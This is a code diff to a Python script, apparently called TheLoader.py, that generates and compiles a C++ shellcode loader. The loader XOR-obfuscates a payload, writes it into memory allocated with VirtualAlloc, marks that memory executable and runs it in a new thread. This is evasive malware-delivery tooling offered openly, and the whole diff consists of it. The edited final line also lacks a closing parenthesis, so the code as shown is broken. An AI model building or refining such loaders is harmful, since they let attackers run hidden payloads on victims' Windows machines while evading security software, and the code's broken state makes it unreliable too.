@@ -14,28 +14,38 @@ def build_loader(payload_path):
     # 2. XOR Obfuscation
     key = 0xAA
     transformed = [b ^ key for b in data]
+    
+    # Convert bytes to a string of hex values
     hex_payload = ", ".join([hex(b) for b in transformed])
 
-    # 3. Create the C++ Loader source
-    loader_source = f"""#include <windows.h>
+    # 3. Create the C++ Loader source using concatenation instead of f-strings
+    # This prevents the syntax error on the curly braces
+    c_part1 = """#include <windows.h>
 #include <stdio.h>
 
-unsigned char payload[] = {{ {hex_payload} }};
+unsigned char payload[] = { """
+    
+    c_part2 = hex_payload
+    
+    c_part3 = """ };
 
-int main() {{
+int main() {
     unsigned char key = 0xAA;
     size_t size = sizeof(payload);
     LPVOID addr = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    for (size_t i = 0; i < size; i++) {{((unsigned char*)addr)[i] = payload[i] ^ key;}}
+    for (size_t i = 0; i < size; i++) {
+        ((unsigned char*)addr)[i] = payload[i] ^ key;
+    }
     DWORD oldProtect;
     VirtualProtect(addr, size, PAGE_EXECUTE_READ, &oldProtect);
     HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
     WaitForSingleObject(hThread, INFINITE);
     return 0;
-}}
+}
 """
+    
     with open("loader.cpp", "w") as f:
-        f.write(loader_source)
+        f.write(c_part1 + c_part2 + c_part3)
 
     # 4. Compile the loader
     print("[*] Compiling loader...")
@@ -53,6 +63,6 @@ int main() {{
 
 if __name__ == "__main__":
     if len(sys.argv) < 2:
-        print("Usage: python3 build.py <payload.exe>")
+        print("Usage: python3 TheLoader.py <payload.exe>")
     else:
-        build_loader(sys.argv[1])
+        build_loader(sys.argv[1]
